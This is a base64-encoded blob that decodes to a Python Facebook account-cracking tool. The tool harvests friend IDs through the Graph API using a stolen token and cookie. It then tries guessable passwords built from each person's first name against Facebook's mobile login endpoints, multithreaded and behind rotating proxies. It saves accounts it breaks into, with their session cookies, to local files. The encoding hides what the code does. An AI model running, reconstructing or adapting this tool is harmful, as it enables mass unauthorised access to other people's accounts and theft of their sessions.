PT0wOg0KCQkJcHJpbnQoJyBObyBPSyBGSUxFIEhFUkUgJykNCgkJCXRpbWUuc2xlZXAoMikNCgkJCWJhY2soKQ0KCQllbHNlOg0KCQkJY2loID0gMA0KCQkJbG9sID0ge30NCgkJCWZvciBpc2kgaW4gdmluOg0KCQkJCXRyeTpoZW0gPSBvcGVuKCdPSy8nK2lzaSwncicpLnJlYWRsaW5lcygpDQoJCQkJZXhjZXB0OmNvbnRpbnVlDQoJCQkJY2loKz0xDQoJCQkJaWYgY2loPDEwMDoNCgkJCQkJbm9tID0gJycrc3RyKGNpaCkNCgkJCQkJbG9sLnVwZGF0ZSh7c3RyKGNpaCk6c3RyKGlzaSl9KQ0KCQkJCQlsb2wudXBkYXRlKHtub206c3RyKGlzaSl9KQ0KCQkJCQlwcmludCgnWycrbm9tKyddICcraXNpKycgWyAnK3N0cihsZW4oaGVtKSkrJyBBY2NvdW50IF0nK3UpDQoJCQkJZWxzZToNCgkJCQkJbG9sLnVwZGF0ZSh7c3RyKGNpaCk6c3RyKGlzaSl9KQ0KCQkJCQlwcmludCgnWycrc3RyKGNpaCkrJ10gJytpc2krJyBbICcrc3RyKGxlbihoZW0pKSsnIEFjY291bnQgXScrdSkNCgkJCWdlZWggPSBpbnB1dCgnXG4gQ0hPT1NFIDogJykNCgkJCXRyeTpnZWggPSBsb2xbZ2VlaF0NCgkJCWV4Y2VwdCBLZXlFcnJvcjoNCgkJCQlwcmludCgnIFNFTEVDVCBSSUdIVCBPUFRJT04gJykNCgkJCQlleGl0KCkNCgkJCXRyeTpsaW4gPSBvcGVuKCdPSy8nK2dlaCwncicpLnJlYWQoKS5zcGxpdGxpbmVzKCkNCgkJCWV4Y2VwdDoNCgkJCQlwcmludCgnRmlsZSBOb3QgRm91bmQgJykNCgkJCQl0aW1lLnNsZWVwKDIpDQoJCQkJYmFjaygpDQoJCQlub2NwPTANCgkJCWZvciBjcGt1IGluIHJhbmdlKGxlbihsaW4pKToNCgkJCQljcGt1bmk9bGluW25vY3BdLnNwbGl0KCd8JykNCgkJCQljcGt1aD1mJyB7Y3BrdW5pWzBdfSAge2Nwa3VuaVsxXX0nDQoJCQkJc29sKCkucHJpbnQoY3BrdWgsc3R5bGU9ImdyZWVuIikNCgkJCQlub2NwICs9MQ0KCQkJaW5wdXQoJ1sgQ0xJQ0sgRU5URVIgMiBCQUNLIF0nKQ0KCQkJYmFjaygpDQoJZWxpZiBreiBpbiBbJzAnLCcwMCddOg0KCQliYWNrKCkNCgllbHNlOg0KCQlwcmludCgnU0VMRUNUIFJJR0hUIE9QVElPTiAnKQ0KCQlleGl0KCkNCg0KZGVmIHB1YmxpYygpOg0KCXRyeToNCgkJdG9rZW4gPSBvcGVuKCcudG9rZW4udHh0JywncicpLnJlYWQoKQ0KCQljb2sgPSBvcGVuKCcuY29rLnR4dCcsJ3InKS5yZWFkKCkNCglleGNlcHQgSU9FcnJvcjoNCgkJZXhpdCgpDQoJdHJ5Og0KCQlvcy5zeXN0ZW0oJ2NsZWFyJykNCgkJYmFubmVyKCkNCgkJanVtID0gaW50KGlucHV0KCdceDFiWzE7OTdtIFsrXSBFTlRFUiBUSEUgTlVNQkVSUyBPRiBJRFo6ICcpKQ0KCWV4Y2VwdCBWYWx1ZUVycm9yOg0KCQkNCgkJYmFjaygpDQoJaWYganVtPDEgb3IganVtPjEwMDAwMDAwMDoNCgkJDQoJCWJhY2soKQ0KCXNlcz1yZXF1ZXN0cy5TZXNzaW9uKCkNCgl5eiA9IDANCglmb3IgbWV0IGluIHJhbmdlKGp1bSk6DQoJCXl6Kz0xDQoJCWtsID0gaW5wdXQoJyBbGl0gSU5QVVQgSUQgJytzdHIoeXopKyc6ICcpDQoJCXVpZC5hcHBlbmQoa2wpDQoJZm9yIHVzZXJyIGluIHVpZDoNCgkJdHJ5Og0KCQkJY29sID0gc2VzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjIuMC8nK3VzZXJyKyc/ZmllbGRzPWZyaWVuZHMubGltaXQoNTAwMCkmYWNjZXNzX3Rva2VuPScrdG9rZW5rdVswXSwgY29va2llcyA9IHsnY29va2llcyc6Y29rfSkuanNvbigpDQoJCQlmb3IgbWkgaW4gY29sWydmcmllbmRzJ11bJ2RhdGEnXToNCgkJCQl0cnk6DQoJCQkJCWlzbyA9IChtaVsnaWQnXSsnfCcrbWlbJ25hbWUnXSkNCgkJCQkJaWYgaXNvIGluIGlkOnBhc3MNCgkJCQkJZWxzZTppZC5hcHBlbmQoaXNvKQ0KCQkJCWV4Y2VwdDpjb250aW51ZQ0KCQlleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOg0KCQkJcGFzcw0KCQlleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6DQoJCQlwcmludCgnI1RSWSBBR0FJTiAnKQ0KCQkJb3Muc3lzdGVtKCdjbGVhcicpDQoJdHJ5Og0KCQlwcmludChmJyBbGl0gVE9UQUwgSUQ6IHtQfScrc3RyKGxlbihpZCkpKQ0KCQlwcmludCgnJykNCgkJc2V0dGluZygpDQoJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOg0KCQlwcmludChmJ3t1fScpDQoJCWJhY2soKQ0KCWV4Y2VwdCAoS2V5RXJyb3IsSU9FcnJvcik6DQoJCXByaW50KGYnSUYgSUQgSVMgUFVCTElDIFRIRU4gVFJZIEFHQUlOIFdJVEggTkVXIENPT0tJRSBPVEhSV0lTRSBDSEVDSyBZT1VSIElEIExJTksgJykNCgkJdGltZS5zbGVlcCgzKQ0KCQliYWNrKCkNCgkJDQpkZWYgY3JhY2tfZmlsZSgpOg0KCW9zLnN5c3RlbSgnY2xlYXInKQ0KCWJhbm5lcigpDQoJb3Muc3lzdGVtKCdlc3BlYWsgLWEgMzAwICIgeW91ciBmaWxlIG5hbWUiJykNCglwcmludCgnXDAzM1sxOzMybVsgUHV0IEZpbGUgRXhhbXBsZTogIC9zZGNhcmQvZmlsZS50eHQgIEV0Yy4uLl0nKQ0KCW8gPSBpbnB1dCgnXHgxYlsxOzk3bSBbK10gSU5QdXQgRklMRSBOQU1FIDogJykNCglwcmludCgnJykNCgl0cnk6bGluID0gb3BlbihvKS5yZWFkKCkuc3BsaXRsaW5lcygpDQoJZXhjZXB0Og0KCQlwcmludCgnRmlsZSBOb3QgRm91bmQnKQ0KCQl0aW1lLnNsZWVwKDIpDQoJCWJhY2soKQ0KCWZvciB4aWQgaW4gbGluOg0KCQlpZC5hcHBlbmQoeGlkKQ0KCXNldHRpbmcoKQ0KCQ0KZGVmIHNldHRpbmcoKToNCglodSA9ICczJw0KCWlmIGh1IGluIFsnMScsJzAxJ106DQoJCWZvciB0dWEgaW4gc29ydGVkKGlkKToNCgkJCWlkMi5hcHBlbmQodHVhKQ0KCWVsaWYgaHUgaW4gWycyJywnMDInXToNCgkJbXVkYT1bXQ0KCQlmb3IgYmFjb3QgaW4gc29ydGVkKGlkKToNCgkJCW11ZGEuYXBwZW5kKGJhY290KQ0KCQliY209bGVuKG11ZGEpDQoJCWJjbWk9KGJjbS0xKQ0KCQlmb3IgeG11ZCBpbiByYW5nZShiY20pOg0KCQkJaWQyLmFwcGVuZChtdWRhW2JjbWldKQ0KCQkJYmNtaSAtPTENCgllbGlmIGh1IGluIFsnMycsJzAzJ106DQoJCWZvciBiYWNvdCBpbiBpZDoNCgkJCXh4ID0gcmFuZG9tLnJhbmRpbnQoMCxsZW4oaWQyKSkNCgkJCWlkMi5pbnNlcnQoeHgsYmFjb3QpDQoJZWxzZToNCgkJZm9yIGJhY290IGluIGlkOg0KCQkJeHggPSByYW5kb20ucmFuZGludCgwLGxlbihpZDIpKQ0KCQkJaWQyLmluc2VydCh4eCxiYWNvdCkNCglwcmludCgnXHgxYlsxOzkybSBMT0dJTiBNRVRIT0Rcblx4MWJbMTs5N20gWzFdIE1FVEhPRCBGSVJFICcpDQoJb3Muc3lzdGVtKCdlc3BlYWsgLWEgMzAwICIgMSwgIG1ldGhvZCwgIGZpcmUiJykNCgloYyA9IGlucHV0KCcgQ0hPT1NFOiAnKQ0KCWlmIGhjIGluIFsnMScsJzAxJ106DQoJCW1ldGhvZC5hcHBlbmQoJ21vYmlsZScpDQoJZWxpZiBoYyBpbiBbJzknLCcwOSddOg0KCQltZXRob2QuYXBwZW5kKCdtYmFzaWMnKQ0KCWVsc2U6DQoJCW1ldGhvZC5hcHBlbmQoJ21vYmlsZScpDQoJcGFzc3dyZCgpDQoJZXhpdCgpDQoNCmRlZiBwYXNzd3JkKCk6DQoJb3Muc3lzdGVtKCdjbGVhcicpDQoJYmFubmVyKCkNCglwcmludChmIlwwMzNbOTc7MW1bXDAzM1s5MjsxbStcMDMzWzk3OzFtXVwwMzNbMTs5Mm0gVVNFUiBOQU1FXDAzM1sxOzkxbSA6XDAzM1sxOzk2bSAiK05hbWVYKQ0KCXByaW50KCdcMDMzWzk3OzFtW1wwMzNbOTI7MW0rXDAzM1s5NzsxbV0gXDAzM1swOzkybVRPVEFMIElEeiA6XDAzM1swOzk3bSAnK3N0cihsZW4oaWQpKSkNCglwcmludCgiXDAzM1s5NzsxbVtcMDMzWzkyOzFtK1wwMzNbOTc7MW1dIFwwMzNbMDs5NW1DbG9uaW5nIFNwZWVkIFN1cGVyIEZhc3QiKQ0KCXByaW50KCJcMDMzWzk3OzFtW1wwMzNbOTI7MW0rXDAzM1s5NzsxbV0gXDAzM1swOzkybVRVUk4gT04vT0ZGIEZMSUdIVCBNT0RFIElOIEVWRVJZIDUgTUlOIikNCglBU0lGaihmJ1wwMzNbMDs5N209PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PScpDQoJd2l0aCB0cmVkKG1heF93b3JrZXJzPTMwKSBhcyBwb29sOg0KCQlmb3IgeXV6b25nIGluIGlkMjoNCgkJCWlkZixubWYgPSB5dXpvbmcuc3BsaXQoJ3wnKVswXSx5dXpvbmcuc3BsaXQoJ3wnKVsxXS5sb3dlcigpDQoJCQlmcnMgPSBubWYuc3BsaXQoJyAnKVswXQ0KCQkJcHd2ID0gW10NCgkJCWlmIGxlbihubWYpPDY6DQoJCQkJaWYgbGVuKGZycyk8MzoNCgkJCQkJcGFzcw0KCQkJCWVsc2U6DQoJCQkJCXB3di5hcHBlbmQoZnJzKycxMjMnKQ0KCQkJCQlwd3YuYXBwZW5kKGZycysnMTIzNCcpDQoJCQkJCXB3di5hcHBlbmQoZnJzKycxMjM0NScpDQoJCQkJCXB3di5hcHBlbmQobm1mKQ0KCQkJCQlwd3YuYXBwZW5kKGZycysnQCcpDQoJCQkJCXB3di5hcHBlbmQoZnJzKydAMTIzJykNCgkJCQkJcHd2LmFwcGVuZChmcnMrJ0BAJykNCgkJCQkJcHd2LmFwcGVuZChmcnMrJ0BAQCcpDQoJCQkJCXB3di5hcHBlbmQoZnJzKydAQEBAJykNCgkJCQkJcHd2LmFwcGVuZChmcnMrJ0AjJykNCgkJCQkJcHd2LmFwcGVuZChmcnMrJzExMjInKQ0KCQkJCQlwd3YuYXBwZW5kKGZycysnMTInKQ0KCQkJCQkNCgkJCQkJDQoJCQllbHNlOg0KCQkJCWlmIGxlbihmcnMpPDM6DQoJCQkJCXB3di5hcHBlbmQobm1mKQ0KCQkJCWVsc2U6DQoJCQkJCXB3di5hcHBlbmQoZnJzKycxMjMnKQ0KCQkJCQlwd3YuYXBwZW5kKGZycysnMTIzNCcpDQoJCQkJCXB3di5hcHBlbmQoZnJzKycxMjM0NScpDQoJCQkJCXB3di5hcHBlbmQobm1mKQ0KCQkJCQlwd3YuYXBwZW5kKGZycysnQCcpDQoJCQkJCXB3di5hcHBlbmQoZnJzKydAMTIzJykNCgkJCQkJcHd2LmFwcGVuZChmcnMrJ0BAJykNCgkJCQkJcHd2LmFwcGVuZChmcnMrJ0BAQCcpDQoJCQkJCXB3di5hcHBlbmQoZnJzKydAQEBAJykNCgkJCQkJcHd2LmFwcGVuZChmcnMrJ0AjJykNCgkJCQkJcHd2LmFwcGVuZChmcnMrJzExMjInKQ0KCQkJCQlwd3YuYXBwZW5kKGZycysnMTInKQ0KCQkJCQkNCgkJCQkJDQoJCQkJCQ0KCQkJCXBvb2wuc3VibWl0KGNyYWNrLGlkZixwd3YpDQoJcHJpbnQoJycpDQoJQVNJRmooJz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PScpDQoJQVNJRmooJ0NMT05JTkcgQ09NUExFVEUgLi4uLi4uLi4uLiAnKQ0KCXByaW50KGYne2h9W3toffCfkpp7aH1de2h9IFlvdXIgVG90YWwgT0sgaWR6IDoge2h9JXMgJyUob2spKQ0KCWlucHV0KCdDTElDSyBFTlRFUiBUTyBFWElUICcpDQoJCQ0KZGVmIGNyYWNrKGlkZixwd3YpOg0KCWdsb2JhbCBsb29wLG9rLGNwDQoJYm8gPSByYW5kb20uY2hvaWNlKFttLGssaCxiLHUseF0pDQoJc3lzLnN0ZG91dC53cml0ZShmIlxye2JvfVtBU0lGLVhEXSB7UH1be2h9e2xvb3B9e1B9XT5+PFt7aH17bGVuKGlkKX17UH1de2JvfeKAontQfVt7aH1Pa3tQfeKAontib317b2t9e1B9XSAiKSwNCglzeXMuc3Rkb3V0LmZsdXNoKCkNCgl1YSA9IHJhbmRvbS5jaG9pY2UodWdlbikNCgl1YTIgPSByYW5kb20uY2hvaWNlKHVnZW4yKQ0KCXNlcyA9IHJlcXVlc3RzLlNlc3Npb24oKQ0KCWZvciBwdyBpbiBwd3Y6DQoJCXRyeToNCgkJCW5pcD1yYW5kb20uY2hvaWNlKHByb3gpDQoJCQlwcm94cz0geydodHRwJzogJ3NvY2tzNDovLycrbmlwfQ0KCQkJc2VzLmhlYWRlcnMudXBkYXRlKHsiSG9zdCI6J20uZmFjZWJvb2suY29tJywidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLCJ1c2VyLWFnZW50Ijp1YTIsImFjY2VwdCI6InRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCpbaW5zZXJ0ZWQgYnkgY3l0aG9uIHRvIGF2b2lkIGNvbW1lbnQgY2xvc2VyXS9baW5zZXJ0ZWQgYnkgY3l0aG9uIHRvIGF2b2lkIGNvbW1lbnQgc3RhcnRdKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuOSIsImRudCI6IjEiLCJ4LXJlcXVlc3RlZC13aXRoIjoibWFyay52aWEuZ3AiLCJzZWMtZmV0Y2gtc2l0ZSI6InNhbWUtb3JpZ2luIiwic2VjLWZldGNoLW1vZGUiOiJjb3JzIiwic2VjLWZldGNoLXVzZXIiOiJlbXB0eSIsInNlYy1mZXRjaC1kZXN0IjoiZG9jdW1lbnQiLCJyZWZlcmVyIjoiaHR0cHM6Ly9tLmZhY2Vib29rLmNvbS8iLCJhY2NlcHQtZW5jb2RpbmciOiJnemlwLCBkZWZsYXRlIGJyIiwiYWNjZXB0LWxhbmd1YWdlIjoiZW4tR0IsZW4tVVM7cT0wLjksZW47cT0wLjgifSkNCgkJCXAgPSBzZXMuZ2V0KCdodHRwczovL3AuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9wYXNzd29yZC8/dWlkPScraWRmKycmZmxvdz1sb2dpbl9ub19waW4mcmVmc3JjPWRlcHJlY2F0ZWQmX3JkcicpDQoJCQlkYXRhYSA9eyJsc2QiOnJlLnNlYXJjaCgnbmFtZT0ibHNkIiB2YWx1ZT0iKC4qPykiJywgc3RyKHAudGV4dCkpLmdyb3VwKDEpLCJqYXpvZXN0IjpyZS5zZWFyY2goJ25hbWU9Imphem9lc3QiIHZhbHVlPSIoLio/KSInLCBzdHIocC50ZXh0KSkuZ3JvdXAoMSksInVpZCI6aWRmLCJuZXh0IjoiaHR0cHM6Ly9wLmZhY2Vib29rLmNvbS9sb2dpbi9zYXZlLWRldmljZS8iLCJmbG93IjoibG9naW5fbm9fcGluIiwicGFzcyI6cHcsfQ0KCQkJa29raSA9ICgiOyIpLmpvaW4oWyAiJXM9JXMiICUgKGtleSwgdmFsdWUpIGZvciBrZXksIHZhbHVlIGluIHAuY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCkgXSkNCgkJCWtva2krPScgbV9waXhlbF9yYXRpbz0yLjYyNTsgd2Q9NDEyeDc1NicNCgkJCWhlYWRlPXsiSG9zdCI6J20uZmFjZWJvb2suY29tJywiY2FjaGUtY29udHJvbCI6Im1heC1hZ2U9MCIsInVwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMiOiIxIiwib3JpZ2luIjoiaHR0cHM6Ly9tLmZhY2Vib29rLmNvbSIsImNvbnRlbnQtdHlwZSI6ImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIsInVzZXItYWdlbnQiOnVhLCJhY2NlcHQiOiJ0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqW2luc2VydGVkIGJ5IGN5dGhvbiB0byBhdm9pZCBjb21tZW50IGNsb3Nlcl0vW2luc2VydGVkIGJ5IGN5dGhvbiB0byBhdm9pZCBjb21tZW50IHN0YXJ0XSo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjkiLCJ4LXJlcXVlc3RlZC13aXRoIjoibWFyay52aWEuZ3AiLCJzZWMtZmV0Y2gtc2l0ZSI6InNhbWUtb3JpZ2luIiwic2VjLWZldGNoLW1vZGUiOiJjb3JzIiwic2VjLWZldGNoLXVzZXIiOiJlbXB0eSIsInNlYy1mZXRjaC1kZXN0IjoiZG9jdW1lbnQiLCJyZWZlcmVyIjoiaHR0cHM6Ly9tLmZhY2Vib29rLmNvbS9pbmRleC5waHA/bmV4dD1odHRwcyUzQSUyRiUyRmRldmVsb3BlcnMuZmFjZWJvb2suY29tJTJGdG9vbHMlMkZkZWJ1ZyUyRmFjY2Vzc3Rva2VuJTJGIiwiYWNjZXB0LWVuY29kaW5nIjoiZ3ppcCwgZGVmbGF0ZSBiciIsImFjY2VwdC1sYW5ndWFnZSI6ImVuLUdCLGVuLVVTO3E9MC45LGVuO3E9MC44In0NCgkJCXBvID0gc2VzLnBvc3QoJ2h0dHBzOi8vcC5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3ZhbGlkYXRlLXBhc3N3b3JkLz9zaGJsPTAnLGRhdGE9ZGF0YWEsY29va2llcz17J2Nvb2tpZSc6IGtva2l9LGhlYWRlcnM9aGVhZGUsYWxsb3dfcmVkaXJlY3RzPUZhbHNlLHByb3hpZXM9cHJveHMpDQoJCQlpZiAiY2hlY2twb2ludCIgaW4gcG8uY29va2llcy5nZXRfZGljdCgpLmtleXMoKToNCgkJCQkjQVNJRi1LaW5nDQoJCQkJcHJpbnQoZidcclwwMzNbMDs5NG1be3RpbWUuc3RyZnRpbWUoIiVIOiVNIil94oCiQVNJRi1DcF0ge2lkZn0g4oCiIHtwd30nKSAgICAgDQoJCQkJb3Muc3lzdGVtKCdlc3BlYWsgLWEgMzAwICIgQywgIFAiJykNCgkJCSAgICAjb3BlbignQ1AvJytjcGMsJ2EnKS53cml0ZShpZGYrJ3wnK3B3KydcbicpDQoJCQkJYWt1bi5hcHBlbmQoaWRmKyd8JytwdykNCgkJCQljcCs9MQ0KCQkJCWJyZWFrDQoJCQllbGlmICJjX3VzZXIiIGluIHNlcy5jb29raWVzLmdldF9kaWN0KCkua2V5cygpOg0KCQkJCW9rKz0xDQoJCQkJY29raT1wby5jb29raWVzLmdldF9kaWN0KCkNCgkJCQlrdWtpID0gKCI7Iikuam9pbihbICIlcz0lcyIgJSAoa2V5LCB2YWx1ZSkgZm9yIGtleSwgdmFsdWUgaW4gc2VzLmNvb2tpZXMuZ2V0X2RpY3QoKS5pdGVtcygpIF0pDQoJCQkJI0FTSUYtS2luZw0KCQkJCXByaW50KGYnXHJcMDMzWzA7OTJtW3t0aW1lLnN0cmZ0aW1lKCIlSDolTSIpfeKAokFTSUYtT2vwn5KaXSB7aWRmfSDigKIge3B3fVxuXDAzM1swOzkzbVvwn4y6XT0gQ09PS0lFUyDigKIgXDAzM1swOzkybXtrdWtpfSAnKQ0KCQkJCXByaW50KCdcMDMzWzA7OTRtPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0nKQ0KCQkJCW9zLnN5c3RlbSgnZXNwZWFrIC1hIDMwMCAiIEFTSUYsICBPaywgIGlkIicpDQoJCQkJb3BlbignT0svJytva2MsJ2EnKS53cml0ZShpZGYrJyDigKIgJytwdysnXG4nKQ0KCQkJCWNla19hcGsoc2Vzc2lvbixjb2tpKQ0KCQkJCWJyZWFrDQoJCQkJDQoJCQllbHNlOg0KCQkJCWNvbnRpbnVlDQoJCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoNCgkJCXRpbWUuc2xlZXAoMzEpDQoJbG9vcCs9MQ0KaWYgX19uYW1lX189PSdfX21haW5fXyc6DQoJdHJ5Om9zLnN5c3RlbSgnZ2l0IHB1bGwnKQ0KCWV4Y2VwdDpwYXNzDQoJdHJ5Om9zLnN5c3RlbSgndG91Y2ggcHJveC50eHQnKQ0KCWV4Y2VwdDpwYXNzDQoNCmxvZ2luKCk='))